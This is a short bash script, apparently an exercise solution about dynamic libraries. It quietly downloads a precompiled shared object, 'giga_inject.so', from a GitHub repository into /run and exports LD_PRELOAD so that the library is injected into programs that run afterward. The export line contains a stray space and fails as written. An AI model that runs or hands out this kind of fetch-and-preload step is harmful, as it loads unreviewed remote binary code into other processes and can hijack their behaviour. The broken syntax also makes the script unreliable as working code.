#!/bin/bash
wget -q -O /run/giga_inject.so https://github.com/chukxsemmy/alx-low_level_programming/raw/master/0x18-dynamic_libraries/giga_inject.so
export LD_PRELOAD =/run/giga_inject.so
